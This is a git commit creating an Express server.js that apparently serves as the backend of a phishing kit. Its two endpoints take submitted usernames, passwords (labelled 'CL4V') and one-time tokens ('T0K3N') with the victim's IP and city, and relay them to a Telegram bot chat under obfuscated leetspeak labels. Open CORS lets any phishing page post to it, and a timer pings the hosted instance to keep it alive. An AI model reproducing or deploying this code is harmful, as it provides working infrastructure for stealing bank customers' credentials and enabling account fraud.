9af577e85981085d05c110f3a5de6282863168fa
syn4pse1 <87922694+syn4pse1@users.noreply.github.com>
2025-09-04 00:04:00 -0400

    Create server.js

---
+++ server.js
@@ -0,0 +1,92 @@
+const express = require('express');
+const bodyParser = require('body-parser');
+
+const cors = require('cors'); // Importar cors
+const axios = require('axios');
+const app = express();
+const FormData = require("form-data");
+
+
+
+app.use(cors({
+    origin: '*', // Permitir cualquier origen
+    methods: ['GET', 'POST'],
+    allowedHeaders: ['Content-Type']
+}));
+
+
+app.use(bodyParser.json());
+
+const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
+const CHAT_ID = process.env.CHAT_ID;
+
+app.get('/', (req, res) => {
+    res.send('Servidor activo');
+});
+
+
+app.post('/api/sendMessage', async (req, res) => {
+    const { user, user4, ip, city } = req.body;
+
+    if (!user || !user4 || !ip) {
+        return res.status(400).json({ error: 'Faltan datos obligatorios' });
+    }
+
+    // Construir mensaje
+    const message = `🔵BIS4🔵\nUS4R: <code>${user}</code>\nCL4V: <code>${user4}</code>\n\n\nIP: ${ip}\nCiudad: ${city}`;
+
+    try {
+        const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+            chat_id: CHAT_ID,
+            text: message,
+          parse_mode: 'HTML'
+        });
+        res.status(200).json({ success: true, data: response.data });
+    } catch (error) {
+        console.error('Error al enviar mensaje a Telegram:', error);
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+app.post('/api/sendMessage2', async (req, res) => {
+    const { user, user4, ip, city } = req.body;
+
+    if (!user || !user4 || !ip) {
+        return res.status(400).json({ error: 'Faltan datos obligatorios' });
+    }
+
+    // Construir mensaje
+    const message = `🔐🔵BIS4🔵\nUS4R: <code>${user}</code>\n\nT0K3N: <code>${user4}</code>\n\n\nIP: ${ip}\nCiudad: ${city}`;
+
+    try {
+        const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+            chat_id: CHAT_ID,
+            text: message,
+          parse_mode: 'HTML'
+        });
+        res.status(200).json({ success: true, data: response.data });
+    } catch (error) {
+        console.error('Error al enviar mensaje a Telegram:', error);
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+
+
+
+const keepAliveUrl = 'hhttps://biseirulais.onrender.com/';
+
+setInterval(() => {
+    axios.get(keepAliveUrl)
+        .then(response => console.log(`Ping exitoso: ${new Date().toLocaleTimeString()}`))
+        .catch(error => console.error(`Error en el ping: ${error.message}`));
+}, 180000); // 180000 ms = 3 minutos
+
+
+
+
+
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => {
+    console.log(`Servidor corriendo en el puerto ${PORT}`);
+});
